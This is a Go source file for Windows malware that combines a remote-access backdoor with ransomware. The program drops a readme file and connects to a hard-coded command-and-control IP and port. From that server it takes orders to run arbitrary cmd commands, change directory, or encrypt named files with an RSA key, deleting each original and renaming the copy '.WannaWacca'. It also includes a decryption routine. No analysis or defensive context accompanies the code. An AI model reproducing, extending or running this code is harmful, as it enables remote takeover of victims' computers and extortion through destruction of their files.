package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	_ "embed"
	"encoding/gob"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

type Message struct {
	Id   string
	Code [4]byte
	Msg  string
}

var UUID string
var tcpConn net.Conn

//go:embed readme.txt
var readMe string

func main() {
	f, err := os.Create("readme.txt")
	chkErr(err)
	_, err = f.Write([]byte(readMe))
	chkErr(err)
	UUID = getUUID()
	tcpAddr, err := net.ResolveTCPAddr("tcp4", "114.116.210.244:53939")
	chkErr(err)
	tcpConn, err = net.DialTCP("tcp", nil, tcpAddr)
	chkErr(err)

	var newMsg = Message{Id: UUID, Code: [4]byte{0, 0, 0, 1}, Msg: ""}
	writeMsg(newMsg, tcpConn)
	readMsg(tcpConn, 65535)

	for {
		time.Sleep(1 * time.Second)
		tcpConn, err = net.DialTCP("tcp", nil, tcpAddr)
		chkErr(err)
		var newMsg = Message{Id: UUID, Code: [4]byte{0, 0, 0, 3}, Msg: ""}
		writeMsg(newMsg, tcpConn)
		var msg = readMsg(tcpConn, 65535)
		if msg.Code == [4]byte{0, 0, 0, 4} {
			tcpConn, err = net.DialTCP("tcp", nil, tcpAddr)
			chkErr(err)
			cmdString := strings.SplitN(msg.Msg, " ", 2)
			if cmdString[0] == "cd" {
				dir, err := filepath.Abs(filepath.Dir(cmdString[1]))
				chkErr(err)
				err = os.Chdir(dir)
				chkErr(err)
				errString := fmt.Sprintln(err)
				newMsg = Message{Id: UUID, Code: [4]byte{0, 0, 0, 1}, Msg: errString}
			} else if cmdString[0] == "enc" {
				cmdString := strings.SplitN(msg.Msg, " ", 3)
				path, err := filepath.Abs(cmdString[1])
				chkErr(err)
				file, err := os.Open(path)
				chkErr(err)
				info, err := file.Stat()
				chkErr(err)
				fileBuf := make([]byte, info.Size())
				_, err = file.Read(fileBuf)
				chkErr(err)
				err = file.Close()
				chkErr(err)
				err = os.Remove(path)
				chkErr(err)

				encData := rsaEncrypt(fileBuf, cmdString[2])
				encPath, err := filepath.Abs(cmdString[1] + ".WannaWacca")
				chkErr(err)
				encFile, err := os.Create(encPath)
				chkErr(err)
				_, err = encFile.Write(encData)
				chkErr(err)

				err = encFile.Close()
				chkErr(err)

				errString := fmt.Sprintln(err)
				newMsg = Message{Id: UUID, Code: [4]byte{0, 0, 0, 1}, Msg: errString}
			} else if cmdString[0] == "dec" {
				cmdString := strings.SplitN(msg.Msg, " ", 3)
				path, err := filepath.Abs(cmdString[1])
				chkErr(err)
				file, err := os.Open(path)
				chkErr(err)
				info, err := file.Stat()
				chkErr(err)
				fileBuf := make([]byte, info.Size())
				_, err = file.Read(fileBuf)
				chkErr(err)
				err = file.Close()
				chkErr(err)
				err = os.Remove(path)
				chkErr(err)

				decData := rsaDecrypt(fileBuf, cmdString[2])
				decPath, err := filepath.Abs(strings.Replace(cmdString[1], ".WannaWacca", "", 1))
				chkErr(err)
				decFile, err := os.Create(decPath)
				chkErr(err)
				_, err = decFile.Write(decData)
				chkErr(err)

				err = decFile.Close()
				chkErr(err)
				errString := fmt.Sprintln(err)
				newMsg = Message{Id: UUID, Code: [4]byte{0, 0, 0, 1}, Msg: errString}
			} else {
				cmd := exec.Command("cmd", "/k", msg.Msg)
				result := runCmd(cmd)
				newMsg = Message{Id: UUID, Code: [4]byte{0, 0, 0, 1}, Msg: string(result)}
			}
			writeMsg(newMsg, tcpConn)
			readMsg(tcpConn, 65535)
		}
	}
}

func rsaEncrypt(plainText []byte, pubKey string) []byte {
	buf := []byte(pubKey)
	block, _ := pem.Decode(buf)
	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	chkErr(err)
	keySize, srcSize := publicKey.Size(), len(plainText)
	offSet, once := 0, keySize-11
	buffer := bytes.Buffer{}
	for offSet < srcSize {
		endIndex := offSet + once
		if endIndex > srcSize {
			endIndex = srcSize
		}
		bytesOnce, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, plainText[offSet:endIndex])
		chkErr(err)
		buffer.Write(bytesOnce)
		offSet = endIndex
	}
	cipherText := buffer.Bytes()
	return cipherText
}

func rsaDecrypt(cipherText []byte, priKey string) []byte {
	buf := []byte(priKey)
	block, _ := pem.Decode(buf)
	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	chkErr(err)
	keySize, srcSize := privateKey.Size(), len(cipherText)
	var offSet = 0
	var buffer = bytes.Buffer{}
	for offSet < srcSize {
		endIndex := offSet + keySize
		if endIndex > srcSize {
			endIndex = srcSize
		}
		bytesOnce, err := rsa.DecryptPKCS1v15(rand.Reader, privateKey, cipherText[offSet:endIndex])
		chkErr(err)
		buffer.Write(bytesOnce)
		offSet = endIndex
	}
	plainText := buffer.Bytes()
	return plainText
}

func writeMsg(message Message, conn net.Conn) {
	buf := new(bytes.Buffer)
	enc := gob.NewEncoder(buf)
	err := enc.Encode(message)
	chkErr(err)
	_, err = conn.Write(buf.Bytes())
	chkErr(err)
}

func readMsg(conn net.Conn, bufSize int) Message {
	rawData := make([]byte, bufSize)
	var msg = Message{}
	n, err := conn.Read(rawData)
	chkErr(err)
	dec := gob.NewDecoder(bytes.NewBuffer(rawData[0:n]))
	if err := dec.Decode(&msg); err != nil {
		log.Println(err)
	}
	return msg
}

func chkErr(err error) {
	if err != nil {
		log.Println(err)
	}
}

func runCmd(cmd *exec.Cmd) []byte {
	stdout, err := cmd.StdoutPipe()
	chkErr(err)
	if err := cmd.Start(); err != nil {
		log.Println(err)
	}
	opBytes, err := ioutil.ReadAll(stdout)
	chkErr(err)
	err = stdout.Close()
	chkErr(err)
	return opBytes
}

func getUUID() string {
	UUID := ""
	systemId := exec.Command("wmic", "csproduct", "get", "UUID")
	opBytes := runCmd(systemId)
	r, _ := regexp.Compile("([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})")
	UUID = r.FindString(string(opBytes))
	if UUID == "" {
		log.Println("No UUID")
	}
	return UUID
}
